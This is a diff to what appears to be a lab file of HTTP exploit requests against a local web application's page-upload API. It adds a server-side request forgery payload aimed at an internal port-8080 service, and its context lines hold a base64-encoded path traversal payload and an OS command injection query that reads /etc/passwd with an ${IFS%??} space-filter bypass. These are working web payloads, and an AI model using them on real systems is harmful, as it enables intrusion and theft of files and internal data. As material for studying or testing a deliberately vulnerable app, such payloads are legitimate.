@@ -178,6 +178,18 @@ Content-Type: text/xml
     <!-- {"fileName":"../../../../../../Pictures/secret.jpg" } -->
     <block type='image'>eyJmaWxlTmFtZSI6Ii4uLy4uLy4uLy4uLy4uL1BpY3R1cmVzL3NlY3JldC5qcGciIH0=</block>
 </page>
+### Exploit: SSRF
+# We suppose that there is another server active on port 8080, not accessible from the Internet
+POST /api/pages HTTP/1.1
+Host: localhost:3001
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Save this outside the boundaries</block  >
+    <!-- { "fileName": "secret", "url": "http://localhost:8080/images/secret.png" } -->
+    <block type='image'>eyAiZmlsZU5hbWUiOiAic2VjcmV0IiwgInVybCI6ICJodHRwOi8vbG9jYWxob3N0OjgwODAvaW1hZ2VzL3NlY3JldC5wbmciIH0=</block>
+</page>
 ### Exploit: OS command injection (cat /etc/passwd)
 # Search query: 'shownoresults";cat${IFS%??}/etc/passwd;echo${IFS%??}-n${IFS%??}"'
 # ${IFS%??} extracts a space from a variable common in all linux systems. This is because spaces are replaced by hyphens ('-') in the code.
